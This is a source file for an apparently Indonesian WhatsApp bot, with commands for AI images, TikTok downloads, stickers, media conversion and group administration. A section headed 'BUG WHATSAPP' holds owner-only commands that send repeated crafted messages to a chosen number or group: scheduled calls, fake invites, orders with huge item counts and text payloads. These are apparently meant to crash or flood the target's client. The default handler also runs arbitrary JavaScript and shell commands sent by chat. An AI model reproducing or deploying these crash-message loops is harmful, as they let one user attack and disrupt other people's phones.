case 'textimg' : {
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`${command} smile face with blush and blue hair`)
    const response = await fetchJson(`https://xzn.wtf/api/midjourney?text=${text}&apikey=kreya`);
   if (response.status == 'FAILURE') return m.reply('gagal')
   let error;
   try {
    conn.sendMessage(from, { image: { url: response.imageUrl }, caption: 'nih' }, { quoted: fkontak });
  }catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
  //END AI MENU
break
//========================TIKTOK=========================//
case 'tiktoknowm': case 'ttnowm': case 'tiktok': case 'tt': {
if (!q) return reply( `Example : ${prefix + command} link`)
paycall(global.wait)
let res = await fetch(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
let data = await res.json()
let json = data.respon
let cap = `𝑨𝑼𝑻𝑯𝑶𝑹 = ${json.author}\n𝐋𝐢𝐤𝐞 = ${json.like}\n𝐂𝐨𝐦𝐦𝐞𝐧𝐭 = ${json.comment}\n𝐒𝐡𝐚𝐫𝐞 = ${json.share}\n𝑫𝑬𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 = ${json.description}`
conn.sendMessage(m.chat, { video: { url: json.media }, caption: cap }, { quoted: fkontak})
};
break
case 'tiktokmp3': case 'ttmp3': case 'ttaudio': {
if (!q) return reply( `Example : ${prefix + command} link`)
paycall(global.wait)
let res = await fetch(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
let data = await res.json()
let json = data.respon
conn.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mp4' }, { quoted: fkontak })
};
break

//========================AKSARA JAWA=========================//
case 'aksarajawa': {
if (!text) return paycall( `Ketik sesuatu biar ketikan lu di generate jadi aksarajawa`)
paycall(global.wait)
let response = await fetch(`https://api.akuari.my.id/other/latinkeaksara?query=${text}`)
let data = await response.json()
   
  conn.sendText(from, data.hasil, fkontak)
}
break
case 'latin': {
if (!text) return paycall( `Caranya kirim teks aksara jawa biar di translate in sama bot`)
paycall(global.wait)
let response = await fetch(`https://api.akuari.my.id/other/aksarakelatin?query=${text}`)
let data = await response.json()
   
  conn.sendText(from, data.hasil, fkontak)
}
break

case 'lens': case 'googlelens': {
if (!/image/.test(mime)) return paycall(`Fitur Lens/Google Lens adalah fitur untuk mengambil teks di gambar, kegunaannya biar mudah ambil teks yang di foto, fitur ini masih tahap beta yang di kembangkan oleh developer shinchan senpai💖, cara pakainya kalian kirim foto yang ada teks nya lalu kalian (ketik : ${prefix} lens / ${prefix} googlelens).`)
paycall(global.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
let response = await fetch(`https://api.akuari.my.id/other/ocr?img=${anu}`)
let data = await response.json()

  conn.sendText(from, data.result, fkontak)
}
}
break
//=========================================================//

/*case 'tt':{ 
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
paytod(global.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { video: { url: data.nowm }, mimetype: 'video/mp4'}, {quoted: fkontak })
})
}
break
case 'ttaudio':{
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
paytod(global.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: fkontak })
})
}
break*/
//========================TIKTOK=========================//
case 'id' :
        if (!isCreator) return m.reply(`*khusus Owner*`)
        paytod(`${m.chat}`)
        break
//========================BUG WHATSAPP=========================//
case 'sendbug': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbuggc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugpc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah; i++) {
var invite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
         "groupJid": "120363144695962190@g.us",
	     "inviteCode": "63bqvAyYvuOQJtwf",
		 "inviteExpiration": "1689703732",
         "groupName": `${vapi()} ${philips}`,
         "jpegThumbnail": thumb,
         "caption": `${num}`
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(num, invite.message, { messageId: invite.key.id })
await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(60* secon)
}
}
break
case 'sendbugtroli': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troli.message, { messageId: troli.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugtroligc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troligc = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troligc.message, { messageId: troligc.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugstik': {
 if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
}
}
break
case 'bugtxt': {
 if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
 let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
}
}
break
case 'testaja': {
if (!isCreator) return m.reply(`*khusus Owner*`)
var interactiveMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"interactiveMessage": {
						"header": {
							"title": "ShinChan",
							"subtitle": "Jumlah 1"
						},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": { 
									"currency": "IDR",
									"external_payment_configurations":[
									{
									"uri": "",
									"type": "payment_instruction",
									"payment_instruction": "Anu"
									}
									],
									"payment_configuration":"",
									"payment_type":"",
									"total_amount": 10000,
									"reference_id":"4N003CFPZ6N",
									"type":"physical-goods",
									"payment_status":"captured",
									"payment_timestamp": 1696052026,
									"order":{"status":"completed","description":"","subtotal": 10000,
									"items":[
									{
									"retailer_id": "custom-item-ef3e2769-f40f-410f-9da4-5b3478de1bc4",
									"name":"ShinChan",
									"amount": 10000,
									"quantity":1}]}}
								}
							]
						}
					}
			}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, interactiveMessage.message, { messageId: interactiveMessage.key.id })
}
break
//========================BUG WHATSAPP=========================//

//STICKER
case 's': case 'sticker': case 'stiker': {
if (!quoted) return paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
await loading()
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return paycall('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'toimg': {
	paycall(global.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return paycall(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await conn.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            conn.sendMessage(m.chat, { image: buffer }, { quoted: fkontak })      
fs.unlinkSync(name)
        })
        
} else return paycall(`Please reply to non animated sticker`)
    }
    break
case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            paycall(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            paycall(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            paycall(global.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return paycall('Reply video')
                if (!/webp/.test(mime)) return paycall(`reply sticker with caption *${prefix + command}*`)
                paycall(global.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'swm': case 'take':
         case 'wm': {
            if (!quoted) return paycall(`Where is the text?`)
            if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Maximum 10 Seconds!')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Photo/Video?`)
            }
            }
         break
//END STICKER
case 'tes':
         case 'runtime':
            paycall(`Runtime : ${runtime(process.uptime())}`)
            break
//GROUP MENU
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let response = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
conn.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await conn.groupInviteCode(from)
conn.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break

case 'kick': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'hidetag': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break


case 'editgroup': {   
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break

case 'editinfo': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
 if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editsubjek': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text nya ?'
await loading()
await conn.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editdesk':{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await loading()
await conn.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break

case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'demote')
break

case 'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'promote')
break

case "welcome":
{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
conn.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'antilink': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antitoxic":
{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

case 'tourl': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}

break

case 'block': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//END GROUP MENU

default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('< ')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
               try {
                  return reply(JSON.stringify(eval(`${args.join(' ')}`), null, '\t'))
               } catch (e) {
                  reply(util.format(e))
               }
            }
if (budy.startsWith('$')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}

if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
